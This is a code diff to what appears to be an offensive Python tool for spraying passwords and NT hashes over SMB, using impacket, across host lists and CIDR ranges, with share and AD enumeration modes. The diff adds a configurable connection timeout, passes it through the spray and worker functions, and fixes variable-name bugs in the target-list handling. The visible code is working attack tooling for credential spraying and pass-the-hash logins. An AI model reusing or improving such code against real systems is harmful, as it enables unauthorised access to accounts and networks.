@@ -14,6 +14,7 @@ nthash = ''
 mode = ''
 username = ''
 time_sec = ''
+timeout = ''
 check = False
 
 # parse cidr
@@ -91,7 +92,7 @@ def get_ip_list(ip):
     return ip_list_tmp
 
 # hash spray
-def spray(username, password, nthash, target_ip, check, port=445):
+def spray(username, password, nthash, target_ip, check, time_out, port=445):
     if '\\' in username:
         domain = username.split('\\')[0]
         username = username.split('\\')[1]
@@ -99,7 +100,7 @@ def spray(username, password, nthash, target_ip, check, port=445):
         domain = ''
     #print(username+' '+domain+' '+password+' '+nthash)
     try:
-        smbClient = SMBConnection(target_ip, target_ip, sess_port=int(port), timeout=15)
+        smbClient = SMBConnection(target_ip, target_ip, sess_port=int(port), timeout=int(time_out))
         smbClient.login(username, password=password, domain=domain, nthash=nthash)
         if check:
             try:
@@ -188,12 +189,12 @@ class MyThread(threading.Thread):
         self.func()
 
 def worker():
-    global mode,username,nthash,password,check,sec,time_sec
+    global mode,username,nthash,password,check,sec,time_sec,timeout
     if mode == 'spray':
         while not q.empty():
             (target_ip,user) = q.get()
             #i = num - q.qsize()
-            spray(user, password, nthash, target_ip, check)
+            spray(user, password, nthash, target_ip, check, timeout)
             time.sleep(int(time_sec))
     elif mode == 'share':
         while not q.empty():
@@ -244,14 +245,16 @@ def main():
     parser.add_argument('-codec', action='store', default='utf-8', dest = "codec", help='point the codec')
     parser.add_argument('-dm', action='store', dest = "Domain", help='domain name')
     parser.add_argument('-f', action='store', dest = "filter", help='filter for adinfo query: [ user|computer|group ]')
+    parser.add_argument('--timeout', action='store', default='15', dest = "time_out", help='time out to set while connecting by smb')
 
     if len(sys.argv)==1:
         parser.print_help()
         sys.exit(1)
     options = parser.parse_args()
 
-    global mode,username,nthash,password,check,time_sec
+    global mode,username,nthash,password,check,time_sec,timeout
     mode = options.mode
+    timeout = options.time_out
     num = options.thread
     time_sec = options.wait
     print('[*] starting u game...')
@@ -272,16 +275,16 @@ def main():
         coms = []
         if options.computerlist is not None:
             for ip in open(options.computerlist,'r').readlines():
-                com.append(ip.strip())
+                coms.append(ip.strip())
         if options.cidr is not None:
             for ip in get_ip_list(CIDR(options.cidr)):
-                com.append(ip.strip())
+                coms.append(ip.strip())
         if options.userlist is not None:
-            for ip in com:
+            for ip in coms:
                 for user in open(options.userlist,'r').readlines():
                     q.put((ip.strip(),user.strip()))
         if options.user is not None:
-            for ip in com:
+            for ip in coms:
                 q.put((ip.strip(),options.user))
         start_thread(num)
 
@@ -329,7 +332,7 @@ def main():
 
         start_thread(num)
         # x.x.x.x/24
-    print('[+] over ^o^')
+        print('[+] over ^o^')
 
     else:
         print('[-] wrong mode...')
@@ -340,4 +343,3 @@ def main():
 if __name__ == '__main__':
     q = queue.Queue()
     main()
-            
